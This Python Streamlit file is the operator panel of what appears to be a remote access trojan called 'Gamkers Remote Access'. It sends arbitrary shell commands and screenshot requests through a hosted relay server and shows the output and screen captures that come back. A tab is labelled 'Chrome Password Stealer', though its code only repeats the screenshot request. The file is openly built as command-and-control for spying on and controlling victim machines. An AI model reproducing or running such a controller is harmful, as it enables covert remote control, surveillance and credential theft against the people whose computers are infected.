import streamlit as st
from st_on_hover_tabs import on_hover_tabs
import requests
from streamlit_lottie import st_lottie
import streamlit_shadcn_ui as ui
from streamlit_extras.stylable_container import stylable_container
import base64
from PIL import Image
import io
from datetime import datetime

# Set page configuration
st.set_page_config(page_title="Gamkers Remote Access", page_icon="🖥️", layout="wide")

# Custom CSS
st.markdown("""
<style>
body {
    background-color: #121212;
    color: #00FF00;
}
.stApp {
    background-color: #121212;
}
.stTextInput > div > div > input {
    color: #00FF00;
    background-color: #1E1E1E;
    border: 1px solid #00FF00;
    border-radius: 5px;
}
.stButton > button {
    color: #121212;
    background-color: #00FF00;
    border: none;
    border-radius: 5px;
}
.stMarkdown {
    color: #00FF00;
}
</style>
""", unsafe_allow_html=True)

# Importing external stylesheet
st.markdown('<style>' + open('./style.css').read() + '</style>', unsafe_allow_html=True)

# API Configuration
API_URL = "https://gamkertestbot.onrender.com"

def decode_image(base64_string):
    img_bytes = base64.b64decode(base64_string)
    return Image.open(io.BytesIO(img_bytes))

def load_lottie(url):
    try:
        response = requests.get(url)
        return response.json() if response.status_code == 200 else None
    except Exception:
        return None

def main():
    # On Hover Tabs Navigation
    with st.sidebar:
        tabs = on_hover_tabs(
            tabName=['Commands', 'Screenshot', 'Message Center','Chrome Password'], 
            iconName=['terminal', 'camera', 'message-square','Commands'], 
            default_choice=0,
            styles={
                'navtab': {'background-color':'#1E1E1E', 
                           'color': '#00FF00', 
                           'font-size': '18px', 
                           'transition': '.3s',
                           'white-space': 'nowrap',
                           'text-transform': 'uppercase'},
                'tabOptionsStyle': {':hover :hover': {'color': '#00FF00', 'cursor': 'pointer'}},
            }
        )

    if tabs == 'Commands':
        commands_page()
    elif tabs == 'Screenshot':
        screenshot_page()
    elif tabs == 'Message Center':
        message_center_page()
    elif tabs == 'Chrome Password':
        chrome()


def commands_page():
    st.title("🖥️ Remote Command Execution")
    
    # Message Input
    with stylable_container(
        key="message_container",
        css_styles="""
        {
            # background-color: #1E1E1E;
            # border: 1px solid #00FF00;
            border-radius: 10px;
            padding: 20px;
        }
        """,
    ):
        # Message Sending Section
        message = st.text_input("Send Message", placeholder="Enter your command")
        
        if st.button("Send Message"):
            if message:
                try:
                    response = requests.post(
                        f"{API_URL}/send_message",
                        json={"message": "cmd "+message, "type": "text"}
                    )
                    if response.status_code == 200:
                        st.success("Message sent successfully!")
                    else:
                        st.error(f"Failed to send message. Status code: {response.status_code}")
                except Exception as e:
                    st.error(f"Error sending message: {str(e)}")

        # Message Retrieval Section
        st.subheader("Received Messages")
        if st.button("Refresh Messages"):
            try:
                response = requests.get(f"{API_URL}/get_messages")
                if response.status_code == 200:
                    messages = response.json()
                    if messages:
                        for msg in reversed(messages):
                            with st.container():
                                time_str = datetime.fromtimestamp(msg['timestamp']).strftime('%Y-%m-%d %H:%M:%S')
                                
                                # Handle text messages
                                if msg['type'] == 'text':
                                    st.markdown(f"**Message at {time_str}**")
                                    st.code(msg['message'], language='text')
                                
                                # Handle image messages
                                elif msg['type'] == 'image':
                                    st.markdown(f"**Image received at {time_str}**")
                                    try:
                                        img = decode_image(msg['image'])
                                        st.image(img, caption=f"Image from {time_str}")
                                    except Exception as e:
                                        st.error(f"Error displaying image: {str(e)}")
                                
                                st.divider()
                    else:
                        st.info("No messages found.")
                else:
                    st.error(f"Failed to retrieve messages. Status code: {response.status_code}")
            except Exception as e:
                st.error(f"Error retrieving messages: {str(e)}")

def screenshot_page():
    st.title("📸 Remote Screenshot")
    
    with stylable_container(
        key="message_container",
        css_styles="""
        {
            # background-color: #1E1E1E;
            # border: 1px solid #00FF00;
            border-radius: 10px;
            padding: 20px;
        }
        """,
    ):
        # Message Sending Section
        message = "get image"
        
        if st.button("Take Screenshot"):
            if message:
                try:
                    response = requests.post(
                        f"{API_URL}/send_message",
                        json={"message": message, "type": "text"}
                    )
                    if response.status_code == 200:
                        st.success("Message sent successfully!")
                    else:
                        st.error(f"Failed to send message. Status code: {response.status_code}")
                except Exception as e:
                    st.error(f"Error sending message: {str(e)}")

        # Message Retrieval Section
        st.subheader("Received Messages")
        if st.button("Refresh Messages"):
            try:
                response = requests.get(f"{API_URL}/get_messages")
                if response.status_code == 200:
                    messages = response.json()
                    if messages:
                        for msg in reversed(messages):
                            with st.container():
                                time_str = datetime.fromtimestamp(msg['timestamp']).strftime('%Y-%m-%d %H:%M:%S')
                                
                                # Handle text messages
                                if msg['type'] == 'text':
                                    st.markdown(f"**Message at {time_str}**")
                                    st.code(msg['message'], language='text')
                                
                                # Handle image messages
                                elif msg['type'] == 'image':
                                    st.markdown(f"**Image received at {time_str}**")
                                    try:
                                        img = decode_image(msg['image'])
                                        st.image(img, caption=f"Image from {time_str}")
                                    except Exception as e:
                                        st.error(f"Error displaying image: {str(e)}")
                                
                                st.divider()
                    else:
                        st.info("No messages found.")
                else:
                    st.error(f"Failed to retrieve messages. Status code: {response.status_code}")
            except Exception as e:
                st.error(f"Error retrieving messages: {str(e)}")

def chrome():
    st.title("Chrome Password Stealer")
    
    with stylable_container(
        key="message_container",
        css_styles="""
        {
            # background-color: #1E1E1E;
            # border: 1px solid #00FF00;
            border-radius: 10px;
            padding: 20px;
        }
        """,
    ):
        # Message Sending Section
        message = "get image"
        
        if st.button("Take Screenshot"):
            if message:
                try:
                    response = requests.post(
                        f"{API_URL}/send_message",
                        json={"message": message, "type": "text"}
                    )
                    if response.status_code == 200:
                        st.success("Message sent successfully!")
                    else:
                        st.error(f"Failed to send message. Status code: {response.status_code}")
                except Exception as e:
                    st.error(f"Error sending message: {str(e)}")

        # Message Retrieval Section
        st.subheader("Received Messages")
        if st.button("Refresh Messages"):
            try:
                response = requests.get(f"{API_URL}/get_messages")
                if response.status_code == 200:
                    messages = response.json()
                    if messages:
                        for msg in reversed(messages):
                            with st.container():
                                time_str = datetime.fromtimestamp(msg['timestamp']).strftime('%Y-%m-%d %H:%M:%S')
                                
                                # Handle text messages
                                if msg['type'] == 'text':
                                    st.markdown(f"**Message at {time_str}**")
                                    st.code(msg['message'], language='text')
                                
                                # Handle image messages
                                elif msg['type'] == 'image':
                                    st.markdown(f"**Image received at {time_str}**")
                                    try:
                                        img = decode_image(msg['image'])
                                        st.image(img, caption=f"Image from {time_str}")
                                    except Exception as e:
                                        st.error(f"Error displaying image: {str(e)}")
                                
                                st.divider()
                    else:
                        st.info("No messages found.")
                else:
                    st.error(f"Failed to retrieve messages. Status code: {response.status_code}")
            except Exception as e:
                st.error(f"Error retrieving messages: {str(e)}")
def message_center_page():
    st.title("💬 Message Center")
    
    # Message Input
    with stylable_container(
        key="message_container",
        css_styles="""
        {
            # background-color: #1E1E1E;
            # border: 1px solid #00FF00;
            border-radius: 10px;
            padding: 20px;
        }
        """,
    ):
        # Message Sending Section
        message = st.text_input("Send Message", placeholder="Enter your message")
        
        if st.button("Send Message"):
            if message:
                try:
                    response = requests.post(
                        f"{API_URL}/send_message",
                        json={"message": message, "type": "text"}
                    )
                    if response.status_code == 200:
                        st.success("Message sent successfully!")
                    else:
                        st.error(f"Failed to send message. Status code: {response.status_code}")
                except Exception as e:
                    st.error(f"Error sending message: {str(e)}")

        # Message Retrieval Section
        st.subheader("Received Messages")
        if st.button("Refresh Messages"):
            try:
                response = requests.get(f"{API_URL}/get_messages")
                if response.status_code == 200:
                    messages = response.json()
                    if messages:
                        for msg in reversed(messages):
                            with st.container():
                                time_str = datetime.fromtimestamp(msg['timestamp']).strftime('%Y-%m-%d %H:%M:%S')
                                
                                # Handle text messages
                                if msg['type'] == 'text':
                                    st.markdown(f"**Message at {time_str}**")
                                    st.code(msg['message'], language='text')
                                
                                # Handle image messages
                                elif msg['type'] == 'image':
                                    st.markdown(f"**Image received at {time_str}**")
                                    try:
                                        img = decode_image(msg['image'])
                                        st.image(img, caption=f"Image from {time_str}")
                                    except Exception as e:
                                        st.error(f"Error displaying image: {str(e)}")
                                
                                st.divider()
                    else:
                        st.info("No messages found.")
                else:
                    st.error(f"Failed to retrieve messages. Status code: {response.status_code}")
            except Exception as e:
                st.error(f"Error retrieving messages: {str(e)}")

if __name__ == "__main__":
    main()
